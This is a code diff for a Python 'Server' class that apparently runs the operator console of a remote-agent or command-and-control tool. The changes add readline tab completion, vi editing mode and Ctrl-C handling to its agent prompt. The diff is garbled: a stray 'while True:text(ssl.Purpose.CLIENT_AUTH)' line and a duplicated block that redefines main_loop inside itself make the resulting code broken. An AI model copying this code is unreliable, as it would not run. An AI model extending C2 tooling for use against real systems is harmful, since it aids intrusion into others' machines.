@@ -3,6 +3,10 @@ import secrets, os, platform, json
 from agent import Agent
 from symbols import *
 import select
+try:
+    import readline  # Linux
+except ImportError:
+    import pyreadline as readline  # Windows
 
 class Server:
                                                                       
@@ -146,13 +150,28 @@ class Server:
         self.context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
         self.context.load_cert_chain(certfile="server.crt", keyfile="server.key")
 
+
         print(self.banner)
         threading.Thread(target=self.acceptConnections).start()
 
     def main_loop(self):
+        while True:text(ssl.Purpose.CLIENT_AUTH)
+        self.context.load_cert_chain(certfile="server.crt", keyfile="server.key")
+
+        print(self.banner)
+        threading.Thread(target=self.acceptConnections).start()
+
+    def main_loop(self):
+        readline.parse_and_bind('tab: complete')
+        readline.parse_and_bind('set editing-mode vi')
         while True:
             active_agent = f"[{len(self.agents)} active]" if self.current_agent.id == 0 else f"[Agent {self.current_agent.id}]"
-            command = input(f"{active_agent}> ").strip()
+            try:
+                command = input(f"{active_agent}> ").strip()
+            except KeyboardInterrupt:
+                print("\nExiting...")
+                # TODO exit function here
+                break
 
             if command:
                 command_name, *args = command.split(' ')
